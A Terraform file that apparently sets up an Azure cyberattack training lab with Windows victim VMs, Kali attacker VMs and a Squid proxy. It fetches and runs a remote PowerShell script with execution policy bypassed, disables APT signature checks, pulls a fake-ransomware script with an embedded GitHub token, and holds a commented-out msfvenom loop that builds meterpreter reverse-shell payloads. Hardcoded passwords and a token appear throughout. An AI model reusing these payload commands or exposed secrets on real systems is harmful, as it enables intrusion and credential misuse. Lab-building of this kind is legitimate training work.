provider "azurerm" {
  features {}
  subscription_id = "d158305e-18e0-46c1-8449-c0188fd44af6"
}

variable "user_count" {
  type    = number
  default = 1
}

variable "windows_vm_count" {
  type    = number
  default = null
}

variable "kali_vm_count" {
  type    = number
  default = null
}

variable "ssh_source_ip" {
  description = "Allowed source IP address range for SSH"
  default     = "0.0.0.0/0"
}

variable "github_token" {
  description = "GitHub PAT"
  type        = string
  sensitive   = true
  default     = "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"
}

locals {
  win_count  = coalesce(var.windows_vm_count, var.user_count)
  kali_count = coalesce(var.kali_vm_count, var.user_count)
}


resource "azurerm_resource_group" "rg" {
  name     = "cyber-handson-rg"
  location = "japaneast"
}

resource "azurerm_virtual_network" "vnet" {
  name                = "cyber-vnet"
  address_space       = ["10.0.0.0/16"]
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name
}

resource "azurerm_subnet" "subnet" {
  name                 = "cyber-subnet"
  resource_group_name  = azurerm_resource_group.rg.name
  virtual_network_name = azurerm_virtual_network.vnet.name
  address_prefixes     = ["10.0.1.0/24"]
}

resource "azurerm_network_security_group" "nsg" {
  name                = "cyber-nsg"
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name

  security_rule {
    name                       = "Allow-RDP"
    priority                   = 1001
    direction                  = "Inbound"
    access                     = "Allow"
    protocol                   = "Tcp"
    source_port_range          = "*"
    destination_port_range     = "3389"
    source_address_prefix      = "*"
    destination_address_prefix = "*"
  }

  security_rule {
    name                       = "Allow-HTTPS"
    priority                   = 1002
    direction                  = "Inbound"
    access                     = "Allow"
    protocol                   = "Tcp"
    source_port_range          = "*"
    destination_port_range     = "443"
    source_address_prefix      = "*"
    destination_address_prefix = "*"
  }

  security_rule {
    name                       = "Allow-SSH"
    priority                   = 1003
    direction                  = "Inbound"
    access                     = "Allow"
    protocol                   = "Tcp"
    source_port_range          = "*"
    destination_port_range     = "22"
    source_address_prefix      = var.ssh_source_ip
    destination_address_prefix = "*"
  }

  security_rule {
    name                       = "Allow-Squid"
    priority                   = 1004
    direction                  = "Inbound"
    access                     = "Allow"
    protocol                   = "Tcp"
    source_port_range          = "*"
    destination_port_range     = "3128"
    source_address_prefix      = "*"
    destination_address_prefix = "*"
  }
}

resource "azurerm_public_ip" "win_public_ip" {
  count               = local.win_count
  name                = format("win-public-ip-%02d", count.index + 1)
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name
  allocation_method   = "Static"
  sku                 = "Standard"
}

resource "azurerm_public_ip" "kali_public_ip" {
  count               = local.kali_count
  name                = format("kali-public-ip-%02d", count.index + 1)
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name
  allocation_method   = "Static"
  sku                 = "Standard"
}

resource "azurerm_network_interface" "win_nic" {
  count               = local.win_count
  name                = format("win-nic-%02d", count.index + 1)
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name

  ip_configuration {
    name                          = "internal"
    subnet_id                     = azurerm_subnet.subnet.id
    private_ip_address_allocation = "Static"
    private_ip_address            = "10.0.1.${count.index + 201}" # 例: win-01 → 10.0.1.201(53ユーザーまで問題ない想定)
    public_ip_address_id          = azurerm_public_ip.win_public_ip[count.index].id
  }
}

resource "azurerm_network_interface" "kali_nic" {
  count               = local.kali_count
  name                = format("kali-nic-%02d", count.index + 1)
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name

  ip_configuration {
    name                          = "kali-ip"
    subnet_id                     = azurerm_subnet.subnet.id
    private_ip_address_allocation = "Static"
    private_ip_address            = "10.0.1.${count.index + 101}" # 例: kali-01 → 10.0.1.101
    public_ip_address_id          = azurerm_public_ip.kali_public_ip[count.index].id
  }
}

resource "azurerm_network_interface_security_group_association" "win_nic_nsg" {
  count                     = local.win_count
  network_interface_id      = azurerm_network_interface.win_nic[count.index].id
  network_security_group_id = azurerm_network_security_group.nsg.id
}

resource "azurerm_network_interface_security_group_association" "kali_nic_nsg" {
  count                     = local.kali_count
  network_interface_id      = azurerm_network_interface.kali_nic[count.index].id
  network_security_group_id = azurerm_network_security_group.nsg.id
}

resource "azurerm_linux_virtual_machine" "proxy" {
  name                            = "proxy-vm"
  location                        = azurerm_resource_group.rg.location
  resource_group_name             = azurerm_resource_group.rg.name
  size                            = "Standard_B1s"
  admin_username                  = "proxyadmin"
  admin_password                  = "Cyb3r3as0n!"
  disable_password_authentication = false
  network_interface_ids           = [azurerm_network_interface.proxy_nic.id]

  os_disk {
    caching              = "ReadWrite"
    storage_account_type = "Standard_LRS"
  }

  source_image_reference {
    publisher = "Canonical"
    offer     = "0001-com-ubuntu-server-focal"
    sku       = "20_04-lts"
    version   = "latest"
  }
}

resource "azurerm_network_interface" "proxy_nic" {
  name                = "proxy-nic"
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name

  ip_configuration {
    name                          = "proxy-ipconfig"
    subnet_id                     = azurerm_subnet.subnet.id
    private_ip_address_allocation = "Static"
    private_ip_address            = "10.0.1.254"
  }
}

resource "azurerm_network_interface_security_group_association" "proxy_nic_nsg" {
  network_interface_id      = azurerm_network_interface.proxy_nic.id
  network_security_group_id = azurerm_network_security_group.nsg.id
}

resource "azurerm_virtual_machine_extension" "proxy_init" {
  name                 = "install-squid"
  virtual_machine_id   = azurerm_linux_virtual_machine.proxy.id
  publisher            = "Microsoft.Azure.Extensions"
  type                 = "CustomScript"
  type_handler_version = "2.1"

  settings = jsonencode({
    commandToExecute = <<EOT
#!/bin/bash
apt-get update && apt-get install -y squid

timedatectl set-timezone Asia/Tokyo
timedatectl set-ntp true

cat <<EOF > /etc/squid/allowed_domains.acl
.cybereason.net
.jp-handson-dp4.cybereason.net
.cybereason.co.jp
.github.com
.github.co.jp
.google.com
.drive.google.com
.accounts.google.com
.accounts.google.co.jp
.mail.google.com
.apis.google.com
.clients6.google.com
.clients4.google.com
.googleusercontent.com
.gstatic.com
.googleapis.com
.debian.org
.debian.net
.security.debian.org
.ubuntu.com
.microsoft.com
.trafficmanager.net
.raw.githubusercontent.com
EOF

cat <<EOF >> /etc/squid/squid.conf
acl SSL_ports port 443
acl CONNECT method CONNECT
http_access allow CONNECT SSL_ports
EOF

cat <<EOF > /etc/squid/squid.conf
http_port 3128
acl allowed_domains dstdomain "/etc/squid/allowed_domains.acl"
http_access allow allowed_domains
http_access deny all
EOF

systemctl restart squid || echo "Squid failed to restart"
systemctl enable squid || echo "Squid failed to enable"
EOT
  })
}

resource "azurerm_windows_virtual_machine" "win" {
  count                 = local.win_count
  name                  = format("win-vm-%02d", count.index + 1)
  computer_name = format("handson-PC-%02d", count.index + 1)
  location              = azurerm_resource_group.rg.location
  resource_group_name   = azurerm_resource_group.rg.name
  size                  = "Standard_B2ms"
  admin_username        = format("handson-user-%02d", count.index + 1)
  admin_password        = "Cybereason123!"
  network_interface_ids = [azurerm_network_interface.win_nic[count.index].id]

  source_image_reference {
    publisher = "MicrosoftWindowsDesktop"
    offer     = "windows-10"
    sku       = "win10-22h2-pro"
    version   = "latest"
  }

  os_disk {
    caching              = "ReadWrite"
    storage_account_type = "Standard_LRS"
  }
}

resource "azurerm_linux_virtual_machine" "kali" {
  count                           = local.kali_count
  name                            = format("kali-vm-%02d", count.index + 1)
  location                        = azurerm_resource_group.rg.location
  resource_group_name             = azurerm_resource_group.rg.name
  size                            = "Standard_B2s"
  admin_username                  = "kali"
  admin_password                  = "Cybereason123!"
  disable_password_authentication = false
  network_interface_ids           = [azurerm_network_interface.kali_nic[count.index].id]

  source_image_reference {
    publisher = "kali-linux"
    offer     = "kali"
    sku       = "kali-2024-4"
    version   = "2024.4.1"
  }
  
  plan {
    name      = "kali-2024-4"
    publisher = "kali-linux"
    product   = "kali"
  }

  os_disk {
    caching              = "ReadWrite"
    storage_account_type = "Standard_LRS"
  }
} 
 
# Windows VMの拡張機能を実行
resource "azurerm_virtual_machine_extension" "win_custom_config" {
  count                = local.win_count
  name                 = format("win-config-%02d", count.index + 1)
  virtual_machine_id   = azurerm_windows_virtual_machine.win[count.index].id
  publisher            = "Microsoft.Compute"
  type                 = "CustomScriptExtension"
  type_handler_version = "1.10" 

  settings = jsonencode({
    commandToExecute = <<-EOT
      powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/cyberattackerdemo/public/main/win_setup.ps1' -OutFile 'C:\Users\Public\win_setup.ps1'; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File C:\Users\Public\win_setup.ps1' -Verb RunAs"
    EOT
  })
  depends_on = [azurerm_windows_virtual_machine.win]
}

resource "azurerm_virtual_machine_extension" "kali_init_config" {
  count                = local.kali_count
  name                 = format("kali-init-config-%02d", count.index + 1)
  virtual_machine_id   = azurerm_linux_virtual_machine.kali[count.index].id
  publisher            = "Microsoft.Azure.Extensions"
  type                 = "CustomScript"
  type_handler_version = "2.1"

  settings = jsonencode({
    commandToExecute = <<-EOT
      #!/bin/bash
      export DEBIAN_FRONTEND=noninteractive

      # 仮想NICが有効になるまで待つ（念のため）
      sleep 20

      # GPGチェックを無効化する一時ファイルを作成
      echo 'Acquire::AllowInsecureRepositories "true";' | tee /etc/apt/apt.conf.d/99insecure
      echo 'Acquire::AllowUnauthenticated "true";' | tee -a /etc/apt/apt.conf.d/99insecure

      # 署名の問題で止まらないようにする
      apt-get update || true

      # curl/gpgインストール（失敗しても次に進む）
      apt-get install -y --allow-unauthenticated curl gnupg || true

      # GPG鍵の追加
      mkdir -p /etc/apt/keyrings
      curl -fsSL https://archive.kali.org/archive-key.asc | gpg --dearmor | tee /etc/apt/keyrings/kali-archive-keyring.gpg > /dev/null

      # sources.listの書き換え（無署名を許容）
      echo "deb [signed-by=/etc/apt/keyrings/kali-archive-keyring.gpg] http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware" > /etc/apt/sources.list

      # 再度更新（この時点で署名が通るようになっている想定）
      apt-get update || true

      # 必要なツール群インストール
      apt-get install -y --allow-unauthenticated curl gnupg postgresql metasploit-framework wget || true

      # テスト用ファイルの配置
      mkdir -p /home/kali/kali
      curl -H "Authorization: token ${var.github_token}" \
        -L https://raw.githubusercontent.com/cyberattackerdemo/main/main/FakeRansom_JP.ps1 \
        -o /home/kali/kali/FakeRansom_JP.ps1
      chown kali:kali /home/kali/kali/FakeRansom_JP.ps1

      LPORT=443
      #OUTDIR="/home/kali/payload"

      # 以下payload_evasion_xx.exeの作成と保存
      #mkdir -p $${OUTDIR}
      #chown kali:kali $${OUTDIR}
      #for i in $(seq 1 30); do
        #LHOST="10.0.1.$((100 + i))"
        #OUTFILE="$${OUTDIR}/payload_evasion_$${i}.exe"
        #HOME=/root msfvenom -p windows/meterpreter/reverse_https LHOST=$${LHOST} LPORT=$${LPORT} -f exe -o $${OUTFILE}
        #chown kali:kali $${OUTFILE}
      #done
      #cp /var/log/cloud-init-output.log $${OUTDIR}/cloud-init-output.log
      #chown kali:kali $${OUTDIR}/cloud-init-output.log

      # cloud-initログの保存
      cp /var/log/cloud-init-output.log /home/kali/cloud-init-output.log || true
      chown kali:kali /home/kali/cloud-init-output.log || true
    EOT
  })

  depends_on = [azurerm_linux_virtual_machine.kali]
}